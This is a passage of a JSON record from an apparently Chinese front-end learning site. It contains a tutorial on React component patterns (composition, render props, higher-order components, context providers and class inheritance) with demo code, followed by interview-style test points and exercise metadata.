name,\n                label,\n                active: name === activeIndex.current,\n                component: item\n            }\n            if(name === activeIndex.current) renderChildren = item\n            tabList.push(tabItem)\n        }\n    })\n    /* 第一次加载，或者 prop chuldren 改变的情况 */\n    if(!renderChildren && tabList.length > 0){\n        const fisrtChildren = tabList[0]\n        renderChildren = fisrtChildren.component\n        activeIndex.current = fisrtChildren.component.props.name\n        fisrtChildren.active = true\n    }\n\n    /* 切换tab */\n    const changeTab=(name)=>{\n        activeIndex.current = name\n        forceUpdate({})\n        onChange && onChange(name)\n    }\n\n    return <div>\n        <div className=\"header\"   >\n            {\n                tabList.map((tab,index) => (\n                    <div className=\"header_item\" key={index}  onClick={() => changeTab(tab.name)} >\n                        <div className={'text'}  >{tab.label}</div>\n                        {tab.active && <div className=\"active_bored\" ></div>}\n                    </div>\n                ))\n            }\n        </div>\n        <div>{renderChildren}</div>\n    </div>\n}\n\nTab.displayName = 'tab' \n```\n\n我写的这个 Tab，负责了整个 Tab 切换的主要功能，包括 **TabItem 的过滤**，**状态收集**，**控制对应的子组件展示**。\n\n+   首先通过 `Children.forEach` 找到符合条件的 `TabItem`。收集 `TabItem`的 props，形成菜单结构。\n+   找到对应的 `children` ，渲染正确的 children 。\n+   提供改变 tab 的方法 `changeTab`。\n+   displayName 标记 `Tab` 组件。这个主要目的方便调试。\n\n**TabItem 的实现**\n\n```js\nconst TabItem = ({ children }) => {\n    return <div>{children}</div>\n}\nTabItem.displayName = 'tabItem'\n```\n\n这个 demo 中的 TabItem 功能十分简单，大部分事情都交给 Tab 做了。\n\nTabItem 做的事情是：\n\n+   展示 `children` （ 我们写在 TabItem 里面的内容 ）\n+   绑定静态属性 `displayName` 。\n\n**效果**\n\n![2.gif](https://static.ecool.fun//article/7b30ae6f-318c-4156-bd42-407f2a5fcb95.awebp)\n\n### 5 总结\n\n组合模式在日常开发中，用途还是比较广泛的，尤其是在一些比较出色的开源项目中，组合模式的总结内容如下：\n\n+   组合模式通过外层组件获取内层组件 children ，通过 cloneElement 传入新的状态，或者控制内层组件渲染。\n+   组合模式还可以和其他组件组合，或者是 render props，拓展性很强，实现的功能强大。\n\n总结流程图如下：\n\n![13.jpg](https://static.ecool.fun//article/1d97bea9-7aba-4e3f-abf8-0b869b39f76d.awebp)\n\n## render props模式\n\n### 1 介绍\n\n`render props` 模式和组合模式类似。区别不同的是，用函数的形式代替 `children`。函数的参数，由容器组件提供，这样的好处，将容器组件的状态，提升到当前外层组件中，这个是一个巧妙之处，也是和组合模式相比最大的区别。\n\n我们先来看一下一个基本的 render props 长什么样子：\n\n```js\nexport default function App (){\n    const aProps = {\n        name:'《React进阶实践指南》'\n    }\n    return <Container>\n        {(cProps) => <Children {...cProps} { ...aProps }  />}\n    </Container>\n}\n```\n\n如上是 render props 的基本样子。可以清楚的看到：\n\n+   `cProps` 为 `Container` 组件提供的状态。\n+   `aProps` 为 `App` 提供的状态。这种模式优点是，能够给 App 的子组件 Container 的状态提升到 App 的 render 函数中。然后可以组合成新的 props，传递给 Children，这种方式让容器化的感念更显而易见。\n\n接下来我们研究一下 render props 原理和细节。\n\n### 2 原理和细节\n\n首先一个问题是 render props 这种方式到底适合什么场景，实际这种模式更适合一种，容器包装，状态的获取。可能这么说有的同学不明白。那么一起看一下 `context` 中的 `Consumer`。就采用 render props 模式。\n\n```js\nconst Context = React.createContext(null)\nfunction Index(){\n    return <Context.Consumer>\n           {(contextValue)=><div>\n               名称：{contextValue.name}\n               作者：{contextValue.author}\n           </div>}\n         </Context.Consumer>\n}\n\nexport default function App(){\n    const value = {\n        name:'《React进阶实践指南》',\n        author:'我不是外星人'\n    }\n    return <Context.Provider value={value} >\n        <Index />\n    </Context.Provider>\n}\n```\n\n+   我们看到 Consumer 就是一个容器组件，包装即将渲染的内容，然后通过 children render 函数执行把状态 `contextValue` 从下游向上游提取。\n\n那么接下来模拟一下 Consumer 的内部实现。\n\n```js\nfunction myConsumer(props){\n    const contextValue = useContext(Context)\n    return props.children(contextValue)\n}\n```\n\n如上就模拟了一个 Consumer 功能，从 Consumer 的实现看 render props 本质就是容器组件产生状态，再通过 children 函数传递下去。所以这种模式我们应该更在乎的是，**容器组件能提供些什么？**\n\n**派生新状态**\n\n相比传统的组合模式，render props 还有一个就是灵活性，可以通过容器组件的状态和当前组件的状态结合，派生出新的状态。比如如下\n\n```js\n <Container>\n        {(cProps) => {\n            const  const nProps =  getNewProps( aProps , cProps )\n            return <Children {...nProps} />\n        }}\n </Container>\n```\n\n+   nProps 是通过当前组件的状态 aProps 和 Container 容器组件 cProps ，合并计算得到的状态。\n\n**反向状态回传**\n\n这种情况比较极端，笔者也用过这种方法，就是可以通过 render props 中的状态，提升到当前组件中，也就是把容器组件内的状态，传递给父组件。比如如下情况。\n\n```js\nfunction GetContanier(props){\n    const dom = useRef()\n    const getDom = () =>  dom.current\n    return <div ref={dom} >\n        {props.children({ getDom })}\n    </div>\n}\n\nexport default function App(){\n     /* 保存 render props 回传的状态 */\n     const getChildren = useRef(null)\n     useEffect(()=>{\n        const childDom = getChildren.current()\n        console.log( childDom,'childDom' )\n     },[])\n    return <GetContanier>\n        {({getDom})=>{\n            getChildren.current = getDom\n            return <div></div>\n        }}\n    </GetContanier>\n}\n```\n\n![3.jpg](https://static.ecool.fun//article/cb63c069-8fce-4a3a-a70e-56e663eed712.awebp)\n\n+   这是一个复杂的状态回传的场景，在 `GetContanier` 将获取元素的方法 `getDom` 通过 render props 回传给父组件。\n+   父组件 App 通过 `getChildren` 保存 render props 回传的内容，在 `useEffect` 调用 getDom 方法，打印内容如下：\n\n但是现实情况不可能是获取一个 dom 这么简单，真实情景下，回传的内容可能更加复杂。\n\n### 3 注意问题\n\n`render props` 的注意问题还是对 children 的校验，和组合模式不同的是，这种模式需要校验 children 是一个函数，只有是函数的情况下，才能执行函数，传递 props 。打一个比方：\n\n```js\nfunction Container (props){\n    const renderChildren =  props.children\n    return typeof renderChildren === 'function' ? renderChildren({ name:'《React进阶时间指南》' }) : null\n}\nexport default function App(){\n    return <Container>\n        {(props)=> <div> 名称 ：{props.name} </div>}\n    </Container>\n}\n```\n\n+   通过 `typeof` 判断 `children` 是一个函数，如果是函数，那么执行函数，传递 props 。\n\n### 4 实践demo\n\n接下来我们实现一个 demo。通过 render props 实现一个带 loading 效果的容器组件，被容器组件包裹，会通过 props 回传开启 loading 的方法 （ 现实场景下，不一定会这么做，这里只是方便同学学习 render props 模式 ） 。\n\n**容器组件 Container**\n\n```js\nfunction Container({ children }){\n   const [ showLoading, setShowLoading ] = useState(false)\n   const renderChildren = useMemo(()=> typeof children === 'function' ? children({ setShowLoading }) : null  ,[children] )\n   return <div style={{ position:'relative' }} >\n     {renderChildren}\n     {showLoading &&  <div className=\"mastBox\" >\n          {<SyncOutlined  className=\"icon\"  spin twoToneColor=\"#52c41a\" />}\n     </div>}\n   </div>\n}\n```\n\n+   `useState`用于显示 loading 效果，useMemo 用于执行 `children` 函数，把改变 state 的方法 setShowLoading 传入 props 中。这里有一个好处就是当 useState 改变的时候，不会触发 `children` 的渲染。\n+   通过 `showLoading` 来显示 loading 效果。\n\n**外层使用**\n\n```js\nexport default function Index(){\n    const setLoading = useRef(null)\n    return <div>\n        <Container>\n            {({ setShowLoading })=>{\n                console.log('渲染')\n                setLoading.current = setShowLoading\n                return <div>\n                     <div className=\"index1\" >\n                         <button onClick={() => setShowLoading(true)} >loading</button>\n                     </div>\n                </div>\n            }}\n        </Container>\n        <button onClick={() => setLoading.current && setLoading.current(false)} >取消 loading </button>\n    </div>\n}\n```\n\n+   通过直接调用 `setShowLoading(true)`显示 loading 效果。\n+   用 useRef 保存状态 setShowLoading ，`Container` 外层也可以调用 setShowLoading 来让 loading 效果消失。\n\n**效果**\n\n![4.gif](https://static.ecool.fun//article/3b8bd338-23fb-4697-974d-2e629a3d1d67.awebp)\n\n### 5 总结\n\n接下来我们总结一下 render props 的特点。\n\n+   容器组件作用是传递状态，执行 children 函数。\n+   外层组件可以根据容器组件回传 props ，进行 props 组合传递给子组件。\n+   外层组件可以使用容器组件回传状态。\n\n这种模式下的原理图如下所示：\n\n![14.jpg](https://static.ecool.fun//article/3775efb2-2aef-4d86-8a61-49e5c010170e.awebp)\n\n## hoc 模式\n\n### 1 介绍\n\nhoc 高阶组件模式也是 React 比较常用的一种包装强化模式之一，高阶函数是接收一个函数，返回一个函数，而所谓**高阶组件，就是接收一个组件，返回一个组件，返回的组件是根据需要对原始组件的强化。**\n\n我们来看一下 hoc 的通用模式。hoc 本质上就是一个函数。\n\n```js\nfunction Hoc (Component){\n    return class Wrap extends React.Component{\n        //---------\n        // 强化操作\n        //---------\n        render(){\n            return <Component { ...this.props } />\n        }\n    }\n}\n```\n\n传统的 HOC 模式如上，我们可以看清楚一个传统的 HOC 做了哪些事。\n\n+   1 HOC 本质是一个函数，传入 `Component` ，也就是原始组件本身。\n+   2 返回一个新的包装的组件 Wrap ，我们可以在 Wrap 中做一些强化原始组件的事。\n+   3 Wrap 中挂载原始组件本身 `Component`。\n\n### 2 原理\n\n接下来我们看一下 hoc 的具体实现原理。hoc 的实现有两种方式，**属性代理**和**反向继承**。\n\n**属性代理** 所谓正向属性代理，就是用组件包裹一层代理组件，在代理组件上，我们可以做一些，对源组件的代理操作。我们可以理解为父子组件关系，父组件对子组件进行一系列强化操作。而 hoc 本身就是返回强化子组件的父组件。\n\n```js\nfunction HOC(WrapComponent){\n    return class Advance extends React.Component{\n       state={\n           name: '《React 进阶实践指南》',\n           author:'我不是外星人'\n       }\n       render(){\n           return <WrapComponent  { ...this.props } { ...this.state }  />\n       }\n    }\n}\n```\n\n属性代理特点：\n\n+   ① 正常属性代理可以和业务组件低耦合，零耦合，对于条件渲染和 `props` 属性增强,只负责控制子组件渲染和传递额外的 `props` 就可以，所以无须知道，业务组件做了些什么。所以正向属性代理，更适合做一些开源项目的 `hoc` ，目前开源的 `HOC` 基本都是通过这个模式实现的。\n+   ② 同样适用于 `class` 声明组件，和 `function` 声明的组件。\n+   ③ 可以完全隔离业务组件的渲染,相比反向继承，属性代理这种模式。可以完全控制业务组件渲染与否，可以避免反向继承带来一些副作用，比如生命周期的执行。\n+   ④ 可以嵌套使用，多个 hoc 是可以嵌套使用的，而且一般不会限制包装HOC的先后顺序。\n\n**反向继承**\n\n反向继承和属性代理有一定的区别，在于包装后的组件继承了业务组件本身，所以我们我无须再去实例化我们的业务组件。当前高阶组件就是继承后，加强型的业务组件。这种方式类似于组件的强化，所以你必须要知道当前继承的组件的状态，内部做了些什么？\n\n```js\nclass Index extends React.Component{\n  render(){\n    return <div> hello,world  </div>\n  }\n}\nfunction HOC(Component){\n    return class wrapComponent extends Component{ /* 直接继承需要包装的组件 */\n\n    }\n}\nexport default HOC(Index) \n```\n\n+   ① 方便获取组件内部状态，比如state，props ,生命周期,绑定的事件函数等\n+   ② es6继承可以良好继承静态属性。我们无须对静态属性和方法进行额外的处理。\n\n### 3 功能及注意事项\n\n上面介绍了 hoc 的二种实现方式，接下来看一下 hoc 能做些什么？以及 hoc 模式的注意事项。\n\n**HOC 的功能**\n\n对于属性代理HOC，我们可以：\n\n+   强化props & 抽离state。\n+   条件渲染，控制渲染，分片渲染，懒加载。\n+   劫持事件和生命周期。\n+   ref控制组件实例。\n+   添加事件监听器，日志\n\n对于反向代理的HOC,我们可以：\n\n+   劫持渲染，操纵渲染树。\n+   控制/替换生命周期，直接获取组件状态，绑定事件。\n\n如果你对上面的每一个功能的具体场景不清楚的话，建议看一下笔者的另外一篇文章： [一文吃透React高阶组件(HOC)](https://juejin.cn/post/6940422320427106335 \"https://juejin.cn/post/6940422320427106335\")\n\n**HOC 注意事项**\n\n+   1 谨慎修改原型链。\n+   2 继承静态属性，这里推荐一个库 `hoist-non-react-statics` 自动拷贝所有的静态方法。\n+   3 跨层级捕获 `ref`，通过 `forwardRef`转发 `ref`。\n+   4 render 中不要声明 `HOC`，如果在 render 声明 hoc，可能会造成组件反复挂载情况发生。\n\n### 4 实践demo\n\n之前有同学在面试中，遇到了这样一个问题，就是如果控制组件挂载的先后顺序，比如如下的场景\n\n```js\nexport default function Index(){\n    return <div>\n        <ComponentA />\n        <ComponentB />\n        <ComponentC />\n    </div>\n}\n```\n\n如上，有三个子组件，`ComponentA` ，`ComponentB`，`ComponentC`，现在期望执行顺序是 ComponentA 渲染完成，挂载 ComponentB ，ComponentB 渲染完成，挂载 ComponentC，也就是三个组件是按照先后顺序渲染挂载的，那么如何实现呢？\n\n实际上，这种情况完全可以用一个 hoc 来实现，那么接下来，请大家跟上我的思路实现这个场景。  \n首先这个 hoc 是针对当前 index 下面，ComponentA ｜ ComponentB ｜ ComponentC 一组 component 进行功能强化。所以这个 hoc 最好可以动态创建，而且服务于当前一组组件。那么可以声明一个生产 hoc 的函数工厂。\n\n```js\nfunction createHoc(){\n   const renderQueue = []            /* 待渲染队列 */\n    return function Hoc(Component){  /* Component - 原始组件   */\n        return class Wrap extends React.Component{  /* hoc 包装组件 */\n         \n        }\n    }\n}\n```\n\n那么我们需要先创建一个 hoc，作为这一组组件的使用。\n\n**使用：**\n\n```js\nconst loadingHoc = createHoc()\n```\n\n知道了 hoc 的动态产生，接下来具体实现一下这个 hoc 。\n\n```js\nfunction createHoc(){\n    const renderQueue = [] /* 待渲染队列 */\n    return function Hoc(Component){\n\n        function RenderController(props){  /* RenderController 用于真正挂载原始组件  */\n            const { renderNextComponent ,...otherprops  } = props\n            useEffect(()=>{\n                renderNextComponent() /* 通知执行下一个需要挂载的组件任务 */\n            },[])\n            return <Component  {...otherprops}  />\n        }\n\n        return class Wrap extends React.Component{\n            constructor(){\n                super()\n                this.state = {\n                    isRender:false\n                }\n                const tryRender = ()=>{\n                    this.setState({\n                        isRender:true\n                    })\n                }\n                if(renderQueue.length === 0) this.isFirstRender = true\n                renderQueue.push(tryRender)\n            }\n            isFirstRender = false      /* 是否是队列中的第一个挂载任务 */\n            renderNextComponent=()=>{  /* 从更新队列中，取出下一个任务，进行挂载 */\n                if(renderQueue.length > 0 ){\n                    console.log('挂载下一个组件')\n                    const nextRender = renderQueue.shift()\n                    nextRender()\n                }\n            }\n            componentDidMount(){  /* 如果是第一个挂载任务，那么需要 */\n                this.isFirstRender && this.renderNextComponent()\n            }\n            render(){\n                const { isRender } = this.state\n                return isRender ? <RenderController {...this.props} renderNextComponent={this.renderNextComponent}  /> : <SyncOutlined   spin />\n            }\n        }\n    }\n}\n```\n\n分析一下主要流程：\n\n+   首先通过 `createHoc` 来创建需要顺序加载的 hoc ，`renderQueue` 存放待渲染的队列。\n+   Hoc 接收原始组件 `Component`。\n+   `RenderController` 用于真正挂载原始组件，用 useEffect 通知执行下一个需要挂载的组件任务，在 hooks 原理的文章中，我讲过 **useEffect** 采用异步执行，也就是说明，是在渲染之后，浏览器绘制已经完成。\n+   Wrap 组件包装了一层 `RenderController`，主要用于渲染更新任务，`isFirstRender` 证明是否是队列中的第一个挂载任务，如果是第一个挂载任务，那么需要在 `componentDidMount` 开始挂载第一个组件。\n+   每一个挂载任务本质上就是 `tryRender` 方法，里面调用了 setState 来渲染 `RenderController`。\n+   每一个挂载任务的函数 `renderNextComponent` 原理很简单，就是获取第一个更新任务，然后执行就可以了。\n+   还有一些细节没有处理，比如说继承静态属性，ref 转发等。\n\n**使用：**\n\n```js\n/* 创建 hoc  */\nconst loadingHoc = createHoc()\n\nfunction CompA(){\n    useEffect(()=>{\n        console.log('组件A挂载完成')\n    },[])\n    return <div>组件 A </div>\n}\nfunction CompB(){\n    useEffect(()=>{\n        console.log('组件\u0010B挂载完成')\n    },[])\n    return <div>组件 B </div>\n}\nfunction CompC(){\n    useEffect(()=>{\n        console.log('组件\u0010C挂载完成')\n    },[])\n    return  <div>组件 C </div>\n}\n\nfunction CompD(){\n    useEffect(()=>{\n        console.log('组件\u0010D挂载完成')\n    },[])\n    return  <div>组件 D </div>\n}\nfunction CompE(){\n    useEffect(()=>{\n        console.log('组件\u0010E挂载完成')\n    },[])\n    return  <div>组件 E </div>\n}\n\n\nconst ComponentA = loadingHoc(CompA)\nconst ComponentB = loadingHoc(CompB)\nconst ComponentC = loadingHoc(CompC)\nconst ComponentD = loadingHoc(CompD)\nconst ComponentE = loadingHoc(CompE)\n\nexport default function Index(){\n    const [ isShow, setIsShow ] = useState(false)\n    return <div>\n        <ComponentA />\n        <ComponentB />\n        <ComponentC />\n        {isShow && <ComponentD />}\n        {isShow && <ComponentE />}\n        <button onClick={()=> setIsShow(true)} > 挂载组件D ，E </button>\n    </div>\n}\n```\n\n**效果：**\n\n![5.gif](https://static.ecool.fun//article/af6110a7-3b16-4a86-b1d7-9cccc9e47171.awebp)\n\n![11.jpg](https://static.ecool.fun//article/d76dd15f-054a-4385-8d28-c004b1aae09d.awebp)\n\n完美达成需求。\n\n### 5 总结\n\nHOC 在实际项目中，应用还是很广泛的，尤其是一些优秀的开源项目中，这里总结了一下 HOC 的原理图：\n\n**属性代理** ![15.jpg](https://static.ecool.fun//article/6445eeaa-21fa-42dc-b24b-7e37fe43a966.awebp)\n\n**反向继承**\n\n![16.jpg](https://static.ecool.fun//article/9c22ecac-13ef-4e91-b6bc-4809235606e8.awebp)\n\n## 提供者模式\n\n### 1 介绍\n\n首先我们来思考一下，为什么 React 会有提供者这种模式呢？\n\n带着这个疑问，首先假设一个场景：在 React 的项目有一个全局变量 `theme` （ `theme` 可能是初始化数据交互获得的，也有可能是切换主题变化的），有一些视图 UI 组件（比如表单 `input` 框、 `button` 按钮），需要 `theme` 里面的变量来做对应的视图渲染，现在的问题是怎么能够把 `theme` 传递下去，合理分配到用到这个 `theme` 的地方。\n\n如果用 `props` 解决这个问题，那么需要通过 `props` 层层绑定，而且还要考虑 `pureComponent`， `memo` 策略的影响。\n\n所以这个时候用提供者模式最好不过了。React 提供了 context ‘提供者’模式，具体模式是这样的，React组件树 Root 节点，用 Provider 提供者注入 theme，然后在需要 theme的 地方，用 Consumer 消费者形式取出theme，供给组件渲染使用即可，这样减少很多无用功。用官网上的一句话形容就是Context 提供了一个无需为每层组件手动添加 props，就能在组件树间进行数据传递的方法。\n\n但是必须注意一点是，提供者永远要在消费者上层，正所谓水往低处流，提供者一定要是消费者的某一层父级。提供者模式的结构图如下：\n\n![8.jpg](https://static.ecool.fun//article/97631003-f299-413b-a80d-79d010da0cd1.awebp)\n\n### 2 用法介绍\n\n对于提供者模式的用法，有老版本的 context 和新版本的 context 之分。接下来重点介绍一下两种方式。\n\n#### 老版本提供者模式\n\n在 React v16.3.0 之前，要实现提供者，就要实现一个 React 组件，不过这个组件要做特殊处理。下面就是一个实现“提供者”的例子，组件名为 ThemeProvider：\n\n**提供者**\n\n```js\nclass ThemeProvider extends React.Component {\n  getChildContext() {\n    return {\n      theme: this.props.value\n    }\n  }\n\n  render() {\n    return (\n      <div>\n         { this.props.children }\n      </div>\n    );\n  }\n}\nThemeProvider.childContextTypes = {\n  theme: PropTypes.object\n}\n```\n\n+   需要实现 `getChildContext` 方法，用于返回数据就是向子孙组件传递的上下文；\n+   需要定义 `childContextTypes` 属性，声明“上下文”的结构类型。\n\n**使用**\n\n```js\n<ThemeProvider value={ { color:'pink' } } >\n    <Index />\n</ThemeProvider>\n```\n\n**消费者**\n\n```js\nconst ThemeConsumer = (props, context) => {\n  const {color} = context.theme\n  return (\n    <p style={{color }}>\n      {props.children}\n    </p>\n  );\n}\n\nThemeConsumer.contextTypes = {\n  theme: PropTypes.object\n}\n```\n\n+   这里需要注意的是，需要通过 `contextTypes` 指定将要消费哪个 context ，否则将无效。\n\n#### 新版本提供者模式\n\n到了 React v16.3.0 的时候，新的 Context API 出来了，开发者可以创建一个 Context ， Context 上有两个属性就是 `Provider` 和 `Consumer` 。\n\n+   `Provider` 用于提供 context 。\n+   `Consumer` 用于消费 context 。\n\n那么接下来介绍一下具体如何使用，首先开发者需要用 createContext api 创建一个 context。\n\n```js\nconst ThemeContext = React.createContext();\n```\n\n然后就是新版本 `Provider` 和 `Consumer`的实现。\n\n**新版提供者**\n\n```js\nfunction ThemeProvider(){\n    const theme = { color:'pink' }\n    return <ThemeContext.Provider value={ theme } >\n        <Index />\n    </ThemeContext.Provider>\n}\n```\n\n+   通过 `ThemeContext` 上的 `Provider` 传递主题信息 `theme` 。\n+   Index 是根部组件。\n\n**新版消费者**\n\n```js\nfunction ThemeConsumer(props){\n    return <ThemeContext.Consumer>\n      { (theme)=>{ /* render children函数 */\n          const { color } = theme\n          return <p style={{color }}>\n           {props.children}\n       </p>\n      } }\n    </ThemeContext.Consumer>\n}\n```\n\n+   Consumer 采用的就是上述讲到的 render props 模式。\n+   通过 Consumer 订阅 context 变化，context 变化， render children 函数重新执行。 render children 函数中第一个参数就是保存的 context 信息。\n+   在新版消费者中，对于函数组件还有 `useContext` 自定义 hooks ，对于类组件有 `contextType` 静态属性。\n\n### 3 实践demo\n\n接下来我们实现一个提供者模式的实践 demo ，通过动态 context 来让消费 context 的 Consumer 动态渲染。\n\n```js\n\nconst ThemeContext = React.createContext(null) // 创建一个 context 上下文 ,主题颜色Context\n\nfunction ConsumerDemo(){\n    return <div>\n         <ThemeContext.Consumer>\n        {\n            (theme) => <div style={{ ...theme}} >\n                  <p>i am alien!</p>\n                  <p>let us learn React!</p>\n             </div>\n        }\n        </ThemeContext.Consumer>\n    </div>\n}\n\nclass Index extends React.PureComponent{\n    render(){\n        return <div>\n            <ConsumerDemo />\n        </div>\n    }\n}\n\nexport default function ProviderDemo(){\n    const [ theme , setTheme ]= useState({ color:'pink' , background:'#ccc' })\n    return <div>\n       <ThemeContext.Provider value={theme}  >\n          <Index  />\n       </ThemeContext.Provider>\n       <button onClick={()=>setTheme({ color:'blue' , background:'orange'  })} >点击</button>\n    </div>\n}\n```\n\n+   Provider 改变，消费订阅 Provider 的 Consumer 会重新渲染。\n\n**效果：**\n\n![9.gif](https://static.ecool.fun//article/7e6ae736-7581-4df9-bfc3-5a33d2a6bc3f.awebp)\n\n### 4 总结\n\n提供者模式在日常开发中，用的频率还是很高的，比如全局传递状态，保存状态。这里用一幅图总结提供者模式的原理。\n\n![17.jpg](https://static.ecool.fun//article/b4132bbe-e06b-49c0-85a9-a818cad1ccfd.awebp)\n\n## 类组件继承\n\n### 1 介绍\n\n> React 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用  \n> 虽然 React 官方推荐**用组合方式**，而**非继承方式**。但是也不是说明继承这种方式没有用武之地，继承方式还是有很多应用场景的。\n\n在 class 组件盛行之后，我们可以通过继承的方式进一步的强化我们的组件。这种模式的好处在于，可以封装基础功能组件，然后根据需要去 extends 我们的基础组件，按需强化组件，但是值得注意的是，必须要对基础组件有足够的掌握，否则会造成一些列意想不到的情况发生。\n\n我们先来看一个\n\n```js\nclass Base extends React.Component{\n  constructor(){\n    super()\n    this.state={\n      name:'《React 进阶实践之指南》'\n    }\n  }\n  componentDidMount(){}\n  say(){\n    console.log('base components')\n  }\n  render(){\n    return <div> hello,world <button onClick={ this.say.bind(this) } >点击</button>  </div>\n  }\n}\nclass Index extends Base{\n  componentDidMount(){\n    console.log( this.state.name )\n  }\n  say(){ /* 会覆盖基类中的 say  */\n    console.log('extends components')\n  }\n}\nexport default Index\n```\n\n+   `Base` 为基础组件，提供一些基础的方法和功能，包括 UI\n+   `Index` 为基于 Base 继承的组件，可以针对 Index 做一些功能性的强化。\n\n### 2 特性\n\n继承增强效果很优秀。它的优势如下：\n\n+   可以控制父类 render，还可以添加一些其他的渲染内容；\n+   可以共享父类方法，还可以添加额外的方法和属性。\n\n但是也有值得注意的地方，就是 `state` 和生命周期会被继承后的组件修改。像上述 `demo` 中， `Person` 组件中的 `componentDidMount` 生命周期将不会被执行。\n\n### 3 实践demo\n\n接下来我们实现一个继承功能，继承的组件就是耳熟能详的 React-Router 中的 Route 组件，强化它，使它变成可以受到权限的控制。\n\n+   当页面有权限，那么直接展示页面内容。\n+   当页面没有权限，那么展示无权限页面。\n\n**代码编写**\n\n```js\nimport { Route } from 'react-router'\n\nconst RouterPermission = React.createContext()\n\nclass PRoute extends Route{\n    static contextType = RouterPermission  /* 使用 context */\n    constructor(...arg){\n        super(...arg)\n        const { path } = this.props\n        /* 如果有权限 */\n        console.log(this.context)\n        const isPermiss = this.context.indexOf(path) >= 0 /* 判断是否有权限 */\n        if(!isPermiss) {\n            /* 修改 render 函数，如果没有权限，重新渲染一个 Route ，ui 是无权限展示的内容  */\n            this.render = () =>  <Route  {...this.props}   >\n                <div>暂无权限</div>\n            </Route>\n        }\n    }\n}\nexport default (props)=>{\n    /* 模拟的有权限的路由列表 */\n    const permissionList = [ '/extends/a' , '/extends/b'  ]\n   return  <RouterPermission.Provider value={permissionList} >\n       <Index {...props} />\n   </RouterPermission.Provider>\n}\n```\n\n+   在根组件传入权限路由。通过 context 模式，保存的是存在权限的路由列表。这里模拟为 `/extends/a` 和 `/extends/b`。\n+   编写 PRoute 权限路由，继承 `react-router` 中的 `Route` 组件。\n+   PRoute 通过 `contextType` 消费指定的权限上下文 `RouterPermission context` 。\n+   在 `constructor` 中进行判断，如果有权限，那么不用做任何处理，如果没有权限，那么重写 render 函数，用 Route 做一个展示容器，展示无权限的 UI 。\n\n**使用**\n\n```js\nfunction Test1 (){\n    return <div>权限路由测试一</div>\n}\n\nfunction Test2 (){\n    return <div>权限路由测试二</div>\n}\n\nfunction Test3(){\n    return <div>权限路由测试三</div>\n}\n\nfunction Index({ history }){\n    const routerlist=[\n        { name:'测试一' ,path:'/extends/a' },\n        { name:'测试二' ,path:'/extends/b' },\n        { name:'测试三' ,path:'/extends/c' }\n    ]\n    return <div>\n        {\n            routerlist.map(item=> <button key={item.path}\n                onClick={()=> history.push(item.path)}\n                                  >{item.path}</button> )\n        }\n        <PRoute component={Test1}\n            path=\"/extends/a\"\n        />\n        <PRoute component={Test2}\n            path=\"/extends/b\"\n        />\n        <PRoute component={Test3}\n            path=\"/extends/c\"\n        />\n    </div>\n}\n\n```\n\n**效果**\n\n![7.gif](https://static.ecool.fun//article/c16fe91b-a67d-4122-8406-482572332e41.awebp)\n\n+   可以看到，只有权限列表中的 `[ '/extends/a' , '/extends/b' ]` 权限能展示，无权限提示暂无权限，完美达到效果。\n\n### 4 总结\n\n继承模式的应用前提是，你需要知道被继承的组件是什么，内部都有什么状态和方法，对继承的组件内部的运转是透明的。接下来用一幅图表示继承模式原理。\n\n![18.jpg](https://static.ecool.fun//article/10bafd99-25bb-4e66-9ee9-0ab79312835e.awebp)\n",
    "testPoint": "## 一、**组合模式（Composition）**\n\n* 通过 `props.children` 组合子组件，避免继承带来的耦合。\n* **考点：**\n\n  * 如何使用 `children` 构建可插拔组件？\n  * 如何传递插槽型内容？\n* **示例：**\n\n  ```jsx\n  const Card = ({ title, children }) => (\n    <div>\n      <h2>{title}</h2>\n      <div>{children}</div>\n    </div>\n  );\n  ```\n\n\n## 二、**容器组件与展示组件（Smart / Dumb Components）**\n\n* **容器组件**：处理数据、状态、逻辑。\n* **展示组件**：只负责展示，靠 props 渲染。\n* **考点：**\n\n  * 为什么要拆分组件职责？\n  * 如何让组件更通用、更可测试？\n* **示例：**\n\n  ```jsx\n  // 展示组件\n  const UserList = ({ users }) => <ul>{users.map(u => <li>{u.name}</li>)}</ul>;\n\n  // 容器组件\n  const UserListContainer = () => {\n    const [users, setUsers] = useState([]);\n    useEffect(() => {\n      fetchUsers().then(setUsers);\n    }, []);\n    return <UserList users={users} />;\n  };\n  ```\n\n\n## 三、**高阶组件（Higher-Order Components, HOC）**\n\n* 函数接收组件并返回新组件，用于复用逻辑。\n* **考点：**\n\n  * HOC 是如何封装逻辑的？\n  * 如何防止 props 冲突和静态属性丢失？\n* **示例：**\n\n  ```jsx\n  function withLoading(Component) {\n    return function WithLoadingComponent({ loading, ...props }) {\n      if (loading) return <p>Loading...</p>;\n      return <Component {...props} />;\n    };\n  }\n  ```\n\n\n## 四、**函数作为子组件（Function as Child / Render Props）**\n\n* 使用函数作为 `children`，动态渲染内容。\n* **考点：**\n\n  * 与 HOC 有何异同？\n  * 存在哪些性能问题（频繁创建函数）？\n* **示例：**\n\n  ```jsx\n  const Mouse = ({ children }) => {\n    const [position, setPosition] = useState({ x: 0, y: 0 });\n    useEffect(() => {\n      const move = e => setPosition({ x: e.clientX, y: e.clientY });\n      window.addEventListener('mousemove', move);\n      return () => window.removeEventListener('mousemove', move);\n    }, []);\n    return children(position);\n  };\n\n  <Mouse>{({ x, y }) => <p>{x}, {y}</p>}</Mouse>\n  ```\n\n\n## 五、**自定义 Hook（Custom Hook）**\n\n* 提取复用逻辑到函数中，适用于函数组件。\n* **考点：**\n\n  * 如何提取副作用逻辑、表单逻辑、状态逻辑？\n  * 如何与上下文、请求、动画结合？\n* **示例：**\n\n  ```jsx\n  function useUserData(id) {\n    const [user, setUser] = useState(null);\n    useEffect(() => {\n      fetchUser(id).then(setUser);\n    }, [id]);\n    return user;\n  }\n  ```\n",
    "exerciseKeyList": "[\"252664a5-1524-46f0-b6ae-ae7e2874f6e2\",\"13f1b2b9-725c-4c16-ada0-fb050fdafe28\",\"5893d2cc-0ce2-473b-9d42-341860dfdec9\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T10:22:21.000Z",
    "updateAt": "2025-07-16T11:40:03.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "13f1b2b9-725c-4c16-ada0-fb050fdafe28",
        "title": "设计模式的六大原则",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:32:23.000Z",
        "updateAt": "2021-07-11T10:52:53.000Z"
      },
      {
        "exerciseKey": "252664a5-1524-46f0-b6ae-ae7e2874f6e2",
